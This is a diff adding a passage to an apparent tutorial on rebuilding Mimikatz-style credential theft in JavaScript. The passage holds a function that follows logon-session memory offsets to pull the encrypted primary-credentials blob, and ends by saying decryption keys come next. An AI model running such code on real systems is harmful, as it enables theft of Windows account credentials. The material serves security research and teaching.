@@ -212,3 +212,31 @@ function getDomainFromLogonSession(ptr) {
 	return domain;
 }
 ```
+
+The final member, *Credentials*, is a bit more complex. It's a pointer to a struct that Mimikatz calls *_KIWI_MSV1_0_CREDENTIALS*. This, in turn, contains a pointer to the actual "primary credentials" object at offset 0x10 (*_KIWI_MSV1_0_PRIMARY_CREDENTIALS*). Within **that** object, we can find the actual credentials blob at offset 0x18.
+
+```javascript
+function getPrimaryCredentialsFromLogonSession(ptr) {
+	// Given a pointer to a LogonSession, extract the encrypted credentials blob.
+	var credentialsPtr = ptr.add(0x108).readPointer();
+	
+	// The credentials pointer can be null, in which case we should abort.
+	if (credentialsPtr.toString() == "0x0") {
+		return null;
+	}
+	
+	// The credentials pointer points to a struct that gentilkiwi calls _KIWI_MSV1_0_CREDENTIALS.
+	// This struct, in turn, contains a pointer to the actual "primary credentials" object at offset 0x10.
+	var primaryCredentialsPtr = credentialsPtr.add(0x10).readPointer();
+	
+	// Within the "primary credentials" object (AKA _KIWI_MSV1_0_PRIMARY_CREDENTIALS), the actual encrypted blob is located at offset 0x18.
+	var cryptoblobPtr = primaryCredentialsPtr.add(0x18);
+	// It's a UNICODE_STRING so we need to parse it to find the correct size and read the cryptoblob.
+	var cryptoblobLen = cryptoblobPtr.readUShort();
+	var cryptoblobBuffer = cryptoblobPtr.add(0x8).readPointer();
+	var cryptoblob = cryptoblobBuffer.readByteArray(cryptoblobLen);
+	return cryptoblob;
+}
+```
+
+Now we have the username, domain name, and credential material. We're not done yet, though. As you might have guessed from the code block above, the credential material is encrypted and is useless to us in its current format. If we want to make use of it, we're going to need to go hunting for decryption keys.
